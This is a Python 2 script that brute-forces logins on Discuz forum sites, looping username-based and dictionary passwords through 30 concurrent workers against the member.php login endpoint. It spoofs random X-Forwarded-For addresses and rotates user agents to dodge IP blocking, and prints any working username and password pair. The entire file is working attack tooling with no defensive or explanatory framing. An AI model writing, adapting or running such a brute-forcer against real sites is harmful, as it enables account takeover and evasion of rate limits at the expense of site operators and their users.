#!/usr/bin/env python
#-*-coding=utf-8-*-
import Queue
import gevent
from random import randint as rand
from gevent import monkey
monkey.patch_all()
import requests
import time
class Blasting():
    def __init__(self,url,userlists):
        self.url=url
        self.user_lists=userlists
        self.queue=Queue.Queue()
        self.run()

    def load_worker(self):
        with open('dict/generate_password.txt','r') as f:
            generate_password=f.readlines()

        with open('dict/user_password.txt','r') as f:
            user_password=f.readlines()

        with open('dict/user_agents.txt','r') as f:
            _ua=f.readlines()

        self.ua=[]
        for i in _ua:
            self.ua.append(i.strip())

        for user in self.user_lists:
            for generate in generate_password:
                self.queue.put([user,user+generate.strip()])

            for password in user_password:
                self.queue.put([user,password.strip()])



    def exploit(self):
        while not self.queue.empty():
            login_list=self.queue.get()
            username=login_list[0]
            password=login_list[1]
            ip='{}.{}.{}.{}'.format(rand(100,254),rand(100,254),rand(100,254),rand(100,254))
            headers={
                'User-Agent': self.ua[rand(0,len(self.ua))],
                'Referer': 'http://www.baidu.com',
                'X-Forwarded-For':ip,
                'Cookie':'discuz=discuz'
            }
            print '\r[ Scaning... ] blasting to {user}:{pwd}\t\t\t\t\t'.format(user=username,pwd=password),
            try:
                html=requests.get(self.url+'/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1&handlekey=ls&quickforward=yes&username={user}&password={pwd}'.format(user=username,pwd=password),headers=headers,timeout=10,allow_redirects=False)
                if 'window.location.href' in html.content:
                    print '\r[ {time} ] username:{user}\tpassword:{pwd}\t\t'.format(time=time.strftime('%X', time.localtime()),user=username,pwd=password)
                    self.queue.queue.clear()
            except Exception as e:
                pass


    def run(self):
        self.load_worker()
        jobs=[]
        for i in range(30):
            jobs.append(gevent.spawn(self.exploit))
        gevent.joinall(jobs)

